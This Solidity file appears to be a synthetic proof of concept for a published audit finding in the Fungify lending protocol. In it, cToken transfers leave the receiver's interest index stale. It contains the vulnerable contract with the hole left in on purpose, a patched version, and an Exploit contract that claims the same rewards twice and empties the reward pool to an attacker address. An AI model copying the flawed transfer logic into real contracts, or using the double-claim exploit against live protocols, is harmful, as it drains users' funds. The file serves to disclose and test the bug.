// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

/*
 * Fungify - [FNG-11] Interest rewards ignore transfers (Hexens, 2023-11-06,
 * finding 62379).
 *
 * SYNTHETIC, CHEATCODE-FREE. supplyInterestStoredInternal is the quoted
 * function. Transferring cTokens does not set the receiver's interestIndex.
 * One 100 ether balance is claimed, moved to a fresh account whose index is
 * still 1e18, and claimed again after supplyIndex has doubled. The interest
 * market pays 200 ether and is emptied. A transfer that syncs both indexes
 * pays 100 and leaves 100.
 */

struct Exp {
    uint256 mantissa;
}

contract RewardToken {
    string public name = "USDC";
    string public symbol = "USDC";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract CErc721 {
    struct SupplyInterestSnapshot {
        uint256 interestIndex;
        uint256 interestAccrued;
    }

    RewardToken public reward;
    uint256 public supplyIndex = 1e18;
    uint256 public paidOut;
    uint256 public drained;
    uint256 public receiverIndexAfter;
    mapping(address => uint256) public accountTokens;
    mapping(address => SupplyInterestSnapshot) public supplyInterest;

    constructor(RewardToken _reward) {
        reward = _reward;
    }

    function exchangeRateStored() public pure returns (uint256) {
        return 1e18;
    }

    function mul_ScalarTruncate(Exp memory rate, uint256 scalar) internal pure returns (uint256) {
        return scalar * rate.mantissa / 1e18;
    }

    function mint(address account, uint256 amount) external {
        accountTokens[account] += amount;
    }

    function poke(address account) external {
        if (supplyInterest[account].interestIndex == 0) {
            supplyInterest[account].interestIndex = supplyIndex;
        }
    }

    function accrue() external {
        supplyIndex = 2e18;
    }

    // Quoted from CErc721.supplyInterestStoredInternal.
    function supplyInterestStoredInternal(address account) public view returns (uint256) {
        Exp memory exchangeRate = Exp({mantissa: exchangeRateStored()});
        uint256 supplyBalance = mul_ScalarTruncate(exchangeRate, accountTokens[account]);

        if (supplyBalance == 0) {
            return 0;
        }

        SupplyInterestSnapshot memory supplyInterestSnapshot = supplyInterest[account];
        // interestIndex is whatever the account last stored. A transfer does not refresh it.
        uint256 newInterestAccrued = (supplyBalance * supplyIndex / supplyInterestSnapshot.interestIndex) - supplyBalance; // @> VULN: stale interestIndex pays the same rewards on a transferred balance
        return supplyInterestSnapshot.interestAccrued + newInterestAccrued;
    }

    function claim(address account) external returns (uint256 owed) {
        owed = supplyInterestStoredInternal(account);
        supplyInterest[account].interestIndex = supplyIndex;
        supplyInterest[account].interestAccrued = 0;
        if (owed > 0) {
            reward.transfer(account, owed);
            paidOut += owed;
        }
    }

    function transfer(address to, uint256 amount) external {
        accountTokens[msg.sender] -= amount;
        accountTokens[to] += amount;
        // Index is intentionally not written. The receiver keeps the old snapshot.
        receiverIndexAfter = supplyInterest[to].interestIndex;
    }

    function note() external {
        drained = paidOut;
    }
}

contract CErc721Fixed {
    struct SupplyInterestSnapshot {
        uint256 interestIndex;
        uint256 interestAccrued;
    }

    RewardToken public reward;
    uint256 public supplyIndex = 1e18;
    mapping(address => uint256) public accountTokens;
    mapping(address => SupplyInterestSnapshot) public supplyInterest;

    constructor(RewardToken _reward) {
        reward = _reward;
    }

    function exchangeRateStored() public pure returns (uint256) {
        return 1e18;
    }

    function mint(address account, uint256 amount) external {
        accountTokens[account] += amount;
    }

    function poke(address account) external {
        if (supplyInterest[account].interestIndex == 0) {
            supplyInterest[account].interestIndex = supplyIndex;
        }
    }

    function accrue() external {
        supplyIndex = 2e18;
    }

    function _owed(address account) internal view returns (uint256) {
        uint256 supplyBalance = accountTokens[account];
        if (supplyBalance == 0) return 0;
        uint256 index = supplyInterest[account].interestIndex;
        if (index == 0) return 0;
        return (supplyBalance * supplyIndex / index) - supplyBalance;
    }

    function _sync(address account) internal {
        uint256 owed = _owed(account);
        if (owed > 0) {
            reward.transfer(account, owed);
        }
        supplyInterest[account].interestIndex = supplyIndex;
        supplyInterest[account].interestAccrued = 0;
    }

    function claim(address account) external returns (uint256 owed) {
        owed = _owed(account);
        _sync(account);
    }

    // FIX: checkpoint both sides before the balance moves, including a zero balance.
    function transfer(address to, uint256 amount) external {
        _sync(msg.sender);
        _sync(to);
        accountTokens[msg.sender] -= amount;
        accountTokens[to] += amount;
    }
}

contract Claimer {
    function poke(CErc721 m) external {
        m.poke(address(this));
    }

    function pokeFixed(CErc721Fixed m) external {
        m.poke(address(this));
    }

    function take(CErc721 m, address to) external {
        m.claim(address(this));
        RewardToken r = m.reward();
        uint256 bal = r.balanceOf(address(this));
        if (bal > 0) r.transfer(to, bal);
    }

    function takeFixed(CErc721Fixed m, address to) external {
        m.claim(address(this));
        RewardToken r = m.reward();
        uint256 bal = r.balanceOf(address(this));
        if (bal > 0) r.transfer(to, bal);
    }
}

contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    RewardToken public reward;
    CErc721 public market;
    Claimer public claimer;

    function run() external {
        reward = new RewardToken(); // nonce 1
        market = new CErc721(reward); // nonce 2
        claimer = new Claimer(); // nonce 3

        reward.mint(address(market), 200 ether);
        market.mint(address(this), 100 ether);
        market.poke(address(this));
        claimer.poke(market);
        market.accrue();
        market.claim(address(this));
        reward.transfer(ATTACKER, reward.balanceOf(address(this)));
        market.transfer(address(claimer), 100 ether);
        claimer.take(market, ATTACKER);
        market.note();

        require(market.receiverIndexAfter() == 1e18, "stale index");
        require(market.supplyIndex() == 2e18, "index doubled");
        require(market.drained() == 200 ether, "paid twice");
        require(reward.balanceOf(ATTACKER) == 200 ether, "drained");
        require(reward.balanceOf(address(market)) == 0, "market empty");
    }
}
